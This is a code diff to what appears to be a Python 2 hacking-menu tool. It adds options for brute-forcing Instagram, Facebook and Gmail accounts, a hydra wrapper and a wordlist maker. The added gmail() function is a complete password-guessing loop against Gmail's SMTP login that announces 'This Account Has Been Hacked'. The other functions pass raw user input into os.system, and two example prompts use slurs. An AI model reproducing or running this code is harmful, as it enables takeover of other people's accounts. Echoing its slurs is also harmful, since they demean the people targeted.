@@ -115,6 +115,13 @@ def help():
 ║               sys  :	sytem info                              ║
 ║               info :  info gather                             ║
 ║               set  :  setoolkit                               ║
+║               insta:  instagram bruteforce                    ║
+║               hydra:  use hydra                               ║
+║               fb   :  facebook bruteforce                     ║
+║               gmail:  gmail bruteforce                        ║
+║               cupp :  wordlist maker                          ║
+║                                                               ║
+║                                                               ║
 ╚\033[94m███████████████████████████████████████████████████████████████\033[93m╝
 	""".decode('utf-8')                                                                
 
@@ -648,6 +655,97 @@ def syn():
   main()
 
 
+def instagram():
+  print "Type username wordlist threads    Example: --> unkn0wn_bali wordlist.txt 60"
+  insta = raw_input("--> ")
+  os.system("python /root/tufhub/password/instagram.py " + insta)
+
+def hydra():
+  print "Example: -l faggot@gmail.com -s 465 -S -v -V -P gmailcrack.txt -t 32  [!dont type hydra just type arguments!]"
+  hydra = raw_input("[HYDRA]$ ")
+  os.system("hydra " + hydra)
+
+def facebook():
+  print "Type Email / ID  Wordlist    Example: [FACEBOOK->]: nigga.andrew777 facelist.txt"
+  facebook = raw_input("[FACEBOOK->]: ")
+  os.system("cd password && perl fb-brute.pl " + facebook)
+
+def gmail():
+  #!/usr/bin/python
+  '''create by Ha3MrX'''
+
+  import smtplib
+  from os import system
+
+  def main():
+     print '================================================='
+     print '               create by Ha3MrX                  '
+     print '================================================='
+     print '               ++++++++++++++++++++              '
+     print '\n                                               '
+     print '  _,.                                            '
+     print '                                                 '
+     print '                                                 '
+     print '           HA3MrX                                '
+     print '       _,.                   '
+     print '     ,` -.)                  '
+     print '    ( _/-\\-._               '
+     print '   /,|`--._,-^|            , '
+     print '   \_| |`-._/||          , | '
+     print '     |  `-, / |         /  / '
+     print '     |     || |        /  /  '
+     print '      `r-._||/   __   /  /   '
+     print '  __,-<_     )`-/  `./  /    '
+     print '  \   `---    \   / /  /     '
+     print '     |           |./  /      '
+     print '     /           //  /       '
+     print ' \_/  \         |/  /        '
+     print '  |    |   _,^- /  /         '
+     print '  |    , ``  (\/  /_         '
+     print '   \,.->._    \X-=/^         '
+     print '   (  /   `-._//^`           '
+     print '    `Y-.____(__}             '
+     print '     |     {__)              ' 
+     print '           ()   V.1.0        '
+
+  main()
+  print '[1] start the attack'
+  print '[2] exit'
+  option = input('==>')
+  if option == 1:
+     file_path = raw_input('path of passwords file :')
+  else:
+     system('clear')
+     exit()
+  pass_file = open(file_path,'r')
+  pass_list = pass_file.readlines()
+  def login():
+      i = 0
+      user_name = raw_input('target email :')
+      server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+      server.ehlo()
+      for password in pass_list:
+        i = i + 1
+        print str(i) + '/' + str(len(pass_list))
+        try:
+           server.login(user_name, password)
+           system('clear')
+           main()
+           print '\n'
+           print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
+           break
+        except smtplib.SMTPAuthenticationError as e:
+           error = str(e)
+           if error[14] == '<':
+              system('clear')
+              main()
+              print '[+] this account has been hacked, password :' + password + '     ^_^'
+
+              break
+           else:
+              print '[!] password not found => ' + password
+  login()
+
 def floodbanner():
 	print N+"""
  ░░█▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
@@ -727,7 +825,7 @@ def menu():
 		if menu == "reboot" :
 			os.system("clear")
 			os.system("service tor restart")
-			os.system("python dedsec.py")
+			os.system("./dedsec.sh")
 		if menu == "tcp" :
 			floodbanner()
 			tcp()
@@ -747,5 +845,15 @@ def menu():
 			os.system("setoolkit")
 		if menu == "syn" :
 			syn()
+		if menu == "insta" :
+			instagram()
+		if menu == "hydra" :
+			hydra()
+		if menu == "fb" :
+			facebook()
+		if menu == "gmail" :
+			gmail()
+		if menu == "cupp" :
+			os.system("cd /root/dedsec/wordlists && cupp -i")
 	found = True
 menu()
